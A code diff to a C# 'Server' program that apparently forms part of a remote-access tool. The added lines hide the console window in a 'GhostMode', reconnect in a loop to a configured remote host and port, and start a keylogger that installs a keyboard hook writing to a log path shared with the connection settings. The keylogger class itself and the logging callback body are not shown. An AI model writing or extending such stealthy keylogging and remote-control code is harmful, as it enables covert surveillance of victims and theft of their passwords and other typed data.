@@ -1,8 +1,14 @@
-﻿namespace Server
+﻿#pragma warning disable CS1998
+
+namespace Server
 {
     using System;
     using System.Threading;
+    using System.Windows.Forms;
+    using System.Threading.Tasks;
+
     using Core.Connection;
+    using Core.Keylogger;
 
     public static class Program
     {
@@ -14,17 +20,23 @@
         {
             _environmentConfiguration = EnvironmentConfiguration.Load();
 
+            if (_environmentConfiguration.GhostMode)
+            {
+                User32.ShowWindow(User32.GetConsoleWindow(), User32.SW_HIDE);
+            }
+
             _connectionConfiguration = new ConnectionConfiguration
             {
                 Host = _environmentConfiguration.Host,
                 PortNumber = _environmentConfiguration.PortNumber,
-                UseProxy = _environmentConfiguration.UseProxy
+                UseProxy = _environmentConfiguration.UseProxy,
+                LoggerPath = _environmentConfiguration.LoggerPath
             };
 
             _connection = new Connection(_connectionConfiguration);
         }
 
-        static void Main(string[] args)
+        public static async void InitializeConnection()
         {
             while (true)
             {
@@ -43,8 +55,8 @@
                             Console.ForegroundColor = ConsoleColor.Red;
                             Console.WriteLine("Error: {0}", ex.Message);
 
-                            // Wait 3 seconds previous to reconnect
-                            Thread.Sleep(3000);
+                            Thread.Sleep(_environmentConfiguration.RetryIntervalConnection);
+
                             break;
                         }
                     }
@@ -54,9 +66,26 @@
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("Error: {0}", ex.Message);
 
-                    // Wait 3 seconds previous to reconnect
-                    Thread.Sleep(3000);
+                    Thread.Sleep(_environmentConfiguration.RetryIntervalConnection);
                 }
+            }
+        }
+
+        static void Main(string[] args)
+        {
+            Task.Run(async () =>
+            {
+                InitializeConnection();
+            });
+
+            using (var keylogger = new Keylogger(_environmentConfiguration.LoggerPath))
+            {
+                keylogger.CreateKeyboardHook((character) =>
+                {
+                    // Log
+                });
+
+                Application.Run();
             }
         }
     }
